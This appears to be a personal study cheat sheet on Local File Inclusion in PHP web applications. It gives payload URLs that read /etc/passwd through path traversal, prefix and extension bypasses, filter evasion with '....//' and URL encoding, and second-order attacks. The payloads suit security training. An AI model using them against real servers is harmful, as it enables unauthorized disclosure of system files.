# Local File Inclusion (LFI)
## Basic LFI

```
http://<SERVER_IP>:<PORT>/index.php?language=es.php
```
###### `language` parameter is vulnerable to LFI then -

```
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```
## Path Traversal
###### We may be restricted to a path. We can traverse it using ../

```
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```
###### This attempt at LFI fails so we use:

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```
## Filename Prefix

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd
```
###### This may fail yet again because

```php
include("lang_" . $_GET['language']);
```
###### This will make our ../../../etc/passwd into lang_../../../etc/passwd which doesnt exit.
###### This can be bypassed with a /

```
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
```
## Appended Extensions

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../etc/passwd
```
###### This may fail yet again because

```php
include($_GET['language'] . ".php");
```
##### To Fix this: (Note: Both apply to old versions of PHP)
###### 1. 2048 times skipping the extension with ./ (limitation of 32 bit systems)

```
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```
###### Automated

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```
###### 2. Using a null byte

```
/etc/passwd%00.php 
```

will become `/etc/passwd` as text after null byte is getting skipped

## Non-Recursive Path Traversal Filters
###### This function could prevent us from doing a path traversal with ../../../

```php
$language = str_replace('../', '', $_GET['language']);
```
###### Bypass using ....// The function will remove ..'../'/ making it ../

```
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```
###### Encoding `../` into `%2e%2e%2f` (URL encoding)

```
<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```
## Approved Paths

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
###### Functions like these could restrict us to a single path/folder. Simple bypass with ../ just add the folder/path name before.

```
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```
## Second-Order Attacks

As we can see, LFI attacks can come in different shapes. Another common, and a little bit more advanced, LFI attack is a `Second Order Attack`. This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.

For example, a web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`). If we craft a malicious LFI username (e.g. `../../../etc/passwd`), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.

In this case, we would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). This is why this attack is called a `Second-Order` attack.

Developers often overlook these vulnerabilities, as they may protect against direct user input (e.g. from a `?page` parameter), but they may trust values pulled from their database, like our username in this case. If we managed to poison our username during our registration, then the attack would be possible.

Exploiting LFI vulnerabilities using second-order attacks is similar to what we have discussed in this section. The only variance is that we need to spot a function that pulls a file based on a value we indirectly control and then try to control that value to exploit the vulnerability.

Note: All techniques mentioned in this section should work with any LFI vulnerability, regardless of the back-end development language or framework.
# Tags
> #Web-Exploitation #LFI #RCE #Filters #Wrappers #Automation #File-Disclosure